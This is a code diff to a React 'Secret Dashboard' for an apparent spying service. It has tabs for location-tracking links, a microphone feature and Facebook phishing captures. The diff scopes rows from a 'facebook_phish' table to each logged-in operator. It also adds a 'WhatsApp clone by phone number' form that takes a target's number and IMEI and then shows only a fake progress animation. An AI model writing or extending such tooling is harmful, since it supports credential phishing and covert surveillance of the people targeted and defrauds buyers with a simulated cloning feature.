@@ -7,11 +7,13 @@ import { supabase } from '../supabase';
 
 function FacebookCaptures() {
   const [links, setLinks] = useState([]);
+  const usuario = localStorage.getItem('usuario');
   useEffect(() => {
     async function fetchLinks() {
       const { data } = await supabase
         .from('facebook_phish')
         .select('*')
+        .eq('email', usuario)
         .order('created_at', { ascending: false });
       setLinks(data || []);
     }
@@ -183,6 +185,119 @@ function MicrophonePlaceholder() {
   );
 }
 
+function WhatsAppSim() {
+  const [option, setOption] = useState('clone');
+  const [phone, setPhone] = useState('');
+  const [device, setDevice] = useState('');
+  const [imei, setImei] = useState('');
+  const [connecting, setConnecting] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [timer, setTimer] = useState(300); // 5:00 in seconds
+  const deviceModels = [
+    'Samsung Galaxy S23',
+    'iPhone 15 Pro',
+    'Xiaomi Redmi Note 12',
+    'Motorola Edge 40',
+    'OnePlus 11',
+    'Google Pixel 8',
+    'Huawei P60',
+    'Asus Zenfone 10',
+    'Other...'
+  ];
+
+  // Simulação de progresso
+  React.useEffect(() => {
+    let interval;
+    if (connecting && progress < 100) {
+      interval = setInterval(() => {
+        setProgress(p => Math.min(100, p + Math.random() * 10 + 5));
+        setTimer(t => t > 0 ? t - 1 : 0);
+      }, 800);
+    }
+    if (progress >= 100) {
+      clearInterval(interval);
+    }
+    return () => clearInterval(interval);
+  }, [connecting, progress]);
+
+  function handleConnect(e) {
+    e.preventDefault();
+    setConnecting(true);
+    setProgress(10);
+    setTimer(300);
+  }
+
+  return (
+    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
+      <h3 style={{ color: 'var(--ouro-tentacao)' }}>WhatsApp</h3>
+      <div style={{ marginBottom: 18 }}>
+        <label style={{ marginRight: 16 }}>
+          <input type="radio" checked={option === 'clone'} onChange={() => setOption('clone')} /> Clone by phone number
+        </label>
+        <label>
+          <input type="radio" checked={option === 'web'} onChange={() => setOption('web')} /> WhatsApp Web
+        </label>
+      </div>
+      {option === 'clone' && (
+        <form onSubmit={handleConnect} style={{ maxWidth: 340, margin: '0 auto', background: 'var(--fundo-destaque)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px rgba(76,76,76,0.08)' }}>
+          <div style={{ marginBottom: 14, textAlign: 'left' }}>
+            <label>Phone number</label>
+            <input type="text" value={phone} onChange={e => setPhone(e.target.value)} required placeholder="e.g. +15551234567" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-conspiracao)', marginTop: 4, fontSize: 15 }} />
+          </div>
+          <div style={{ marginBottom: 14, textAlign: 'left' }}>
+            <label>Device model</label>
+            <select value={device} onChange={e => setDevice(e.target.value)} required style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-conspiracao)', marginTop: 4, fontSize: 15 }}>
+              <option value="">Select a model...</option>
+              {deviceModels.map(m => <option key={m} value={m}>{m}</option>)}
+            </select>
+          </div>
+          <div style={{ marginBottom: 18, textAlign: 'left' }}>
+            <label>IMEI</label>
+            <input type="text" value={imei} onChange={e => setImei(e.target.value)} required placeholder="e.g. 356938035643809" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-conspiracao)', marginTop: 4, fontSize: 15 }} />
+          </div>
+          <button type="submit" disabled={connecting} style={{
+            background: 'var(--vermelho-paixao)',
+            color: 'var(--branco-confissao)',
+            borderRadius: 8,
+            padding: '0.75rem 2rem',
+            fontFamily: 'Montserrat',
+            fontWeight: 'bold',
+            fontSize: '1.1rem',
+            border: 'none',
+            cursor: connecting ? 'not-allowed' : 'pointer',
+            transition: 'background 0.2s',
+            marginTop: 8
+          }}>Connect</button>
+          {connecting && (
+            <div style={{ marginTop: 28, textAlign: 'left' }}>
+              <div style={{ width: '100%', background: '#333', borderRadius: 6, height: 16, marginBottom: 8 }}>
+                <div style={{ width: `${progress}%`, background: 'var(--vermelho-paixao)', height: 16, borderRadius: 6, transition: 'width 0.5s' }} />
+              </div>
+              <div style={{ fontSize: 15, marginBottom: 6 }}><b>Connecting to WhatsApp</b></div>
+              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring... {Math.floor(timer/60)}:{(timer%60).toString().padStart(2,'0')}</div>
+              <div style={{ fontSize: 14, marginBottom: 4 }}>{Math.floor(progress)}%</div>
+              <div style={{ fontSize: 14, marginBottom: 4, color: progress > 20 ? 'var(--sucesso)' : 'var(--cinza-conspiracao)' }}>✅ Network connected</div>
+              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring WhatsApp activity...</div>
+              <div style={{ fontSize: 14, marginBottom: 4 }}>Synchronizing with WhatsApp...</div>
+              <div style={{ fontSize: 13, marginTop: 10, color: 'var(--aviso)' }}>
+                <b>IMPORTANT:</b> Stay connected to the network throughout the entire process. The connection may take a few minutes.
+              </div>
+            </div>
+          )}
+        </form>
+      )}
+      {option === 'web' && (
+        <div style={{ marginTop: 32, background: 'var(--fundo-destaque)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px rgba(76,76,76,0.08)', fontSize: 16 }}>
+          <b>WhatsApp Web</b>
+          <div style={{ marginTop: 12, color: 'var(--cinza-conspiracao)' }}>
+            This feature is coming soon.
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
 export default function Dashboard({ email }) {
   const [active, setActive] = useState('Spy Location');
 
@@ -204,25 +319,28 @@ export default function Dashboard({ email }) {
       }}>
         <Header />
         <div style={{ width: '100%', maxWidth: 600 }}>
-          <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8 }}>Secret Dashboard</h2>
-          <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32 }}>Welcome, <b>{email}</b>!</p>
-          {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
-          {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
-          {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
-          {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && (
-            <div style={{
-              background: 'var(--fundo-destaque)',
-              borderRadius: 16,
-              boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
-              padding: '2.5rem 1.5rem',
-              textAlign: 'center',
-              color: 'var(--cinza-conspiracao)',
-              fontSize: 20,
-              marginTop: 32
-            }}>
-              <b>{active}</b> coming soon...
-            </div>
-          )}
+          <div className="card-glass">
+            <h2 style={{ color: 'var(--ouro-tentacao)', textAlign: 'center', marginBottom: 8, fontFamily: 'Poppins' }}>Secret Dashboard</h2>
+            <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32, fontSize: 17 }}>Welcome, <b>{email}</b>!</p>
+            {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
+            {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
+            {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
+            {active === 'WhatsApp' && <WhatsAppSim />}
+            {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && active !== 'WhatsApp' && (
+              <div style={{
+                background: 'var(--fundo-destaque)',
+                borderRadius: 16,
+                boxShadow: '0 4px 24px rgba(76,76,76,0.12)',
+                padding: '2.5rem 1.5rem',
+                textAlign: 'center',
+                color: 'var(--cinza-conspiracao)',
+                fontSize: 20,
+                marginTop: 32
+              }}>
+                <b>{active}</b> coming soon...
+              </div>
+            )}
+          </div>
         </div>
       </div>
     </div>
